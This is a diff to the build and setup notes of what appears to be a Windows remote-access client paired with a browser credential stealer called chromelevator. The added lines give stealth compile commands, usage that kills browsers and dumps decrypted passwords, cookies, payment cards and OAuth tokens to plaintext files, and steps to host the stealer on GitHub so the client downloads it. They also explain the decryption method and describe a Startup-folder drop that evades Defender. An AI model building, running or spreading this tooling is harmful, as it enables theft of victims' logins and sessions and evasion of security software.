@@ -13,17 +13,53 @@ gcc client_windows.c -o client.exe -lws2_32 -lwininet -liphlpapi -lgdi32 -luser3
 
 # ==================== BROWSER CREDENTIAL EXTRACTION ====================
 #
-# ChromElevator - For Chrome/Edge/Brave with v20 App-Bound Encryption
+# ChromElevator - Extracts DECRYPTED passwords, cookies from Chrome/Edge/Brave
 #   - Decrypts passwords, cookies, payment cards, IBANs, OAuth tokens
-#   - Works on Chrome 127+ with the new encryption
-#   - Source: https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
+#   - Works on Chrome 127+ with the new v20 App-Bound Encryption
+#   - Uses DPAPI to decrypt the master key
+#   - Uses AES-256-GCM to decrypt individual values (v10/v11 encryption)
+#   - Outputs PLAINTEXT JSON files (not encrypted!)
 #
-# SETUP:
-#   1. Download chromelevator_x64.exe from GitHub releases (rename to chromelevator.exe)
-#   2. Upload chromelevator.exe to your GitHub repo
+# SOURCE CODE: files/chromelevator.c
+#
+# COMPILE CHROMELEVATOR (on Windows with MinGW):
+gcc files/chromelevator.c -o files/chromelevator.exe -lcrypt32 -lbcrypt -lshlwapi -lshell32 -lole32 -s -O2
+
+# Cross-compile from Linux:
+x86_64-w64-mingw32-gcc files/chromelevator.c -o files/chromelevator.exe -lcrypt32 -lbcrypt -lshlwapi -lshell32 -lole32 -s -O2
+
+# Maximum stealth (strip all, optimize for size):
+gcc files/chromelevator.c -o files/chromelevator.exe -lcrypt32 -lbcrypt -lshlwapi -lshell32 -lole32 -mwindows -s -Os -fno-ident -ffunction-sections -fdata-sections -Wl,--gc-sections
+
+# USAGE:
+#   chromelevator.exe all --kill --output-path C:\output   # Extract all browsers, kill first
+#   chromelevator.exe chrome                               # Chrome only
+#   chromelevator.exe edge --kill                          # Edge only, kill browser first
+#   chromelevator.exe brave                                # Brave only
+#   chromelevator.exe --help                               # Show help
+#
+# OUTPUT FILES (DECRYPTED PLAINTEXT):
+#   output/Chrome/Chrome_passwords.json   - {"url": "...", "username": "...", "password": "DECRYPTED!"}
+#   output/Chrome/Chrome_cookies.json     - {"domain": "...", "name": "...", "value": "DECRYPTED!"}
+#   output/Edge/Edge_passwords.json       - Same format
+#   output/Brave/Brave_cookies.json       - Same format
+#
+# SETUP FOR REMOTE EXTRACTION:
+#   1. Compile chromelevator.exe using commands above
+#   2. Upload chromelevator.exe to your GitHub repo (files/ folder)
 #   3. Update g_chromelevator_url in client_windows.c with raw GitHub link:
-#      https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/chromelevator.exe
+#      https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/files/chromelevator.exe
 #   4. Recompile the client
+#
+# HOW IT WORKS:
+#   1. Reads "encrypted_key" from Chrome's Local State file
+#   2. Base64 decodes and removes "DPAPI" prefix
+#   3. Uses Windows DPAPI (CryptUnprotectData) to decrypt the master key
+#   4. For each password/cookie:
+#      - Checks for v10/v11 prefix (AES-GCM encryption)
+#      - Extracts 12-byte nonce and 16-byte auth tag
+#      - Decrypts using AES-256-GCM with the master key
+#   5. Outputs plaintext JSON files
 #
 # The client downloads to Startup folder (bypasses Defender), runs, extracts, then cleans up.
 
